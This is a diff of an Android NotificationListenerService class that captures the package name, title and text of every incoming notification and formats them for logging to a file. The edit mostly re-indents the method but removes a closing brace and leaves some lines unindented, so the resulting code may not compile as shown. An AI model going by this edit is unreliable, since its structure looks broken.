@@ -31,16 +31,16 @@ public class NotificationService extends NotificationListenerService {
     }
 
     @Override
-public void onNotificationPosted(StatusBarNotification sbn) {
-    try {
-        String pacote = sbn.getPackageName();
-        String texto = "";
+    public void onNotificationPosted(StatusBarNotification sbn) {
+        try {
+            String pacote = sbn.getPackageName();
+            String texto = "";
         
-        if (sbn.getNotification().extras != null) {
-            CharSequence title = sbn.getNotification().extras.getCharSequence("android.title");
-            CharSequence text = sbn.getNotification().extras.getCharSequence("android.text");
-            texto = (title != null ? title.toString() : "") + " - " + (text != null ? text.toString() : "");
-        }
+            if (sbn.getNotification().extras != null) {
+                CharSequence title = sbn.getNotification().extras.getCharSequence("android.title");
+                CharSequence text = sbn.getNotification().extras.getCharSequence("android.text");
+                texto = (title != null ? title.toString() : "") + " - " + (text != null ? text.toString() : "");
+            }
 
         // Formato: pacote|texto_da_notificacao
         String linha = pacote + "|" + texto + "\n";
@@ -55,7 +55,6 @@ public void onNotificationPosted(StatusBarNotification sbn) {
     } catch (Exception e) {
         e.printStackTrace();
     }
-}
 
     private void logToFile(String message) {
         saveText(message + "\n");
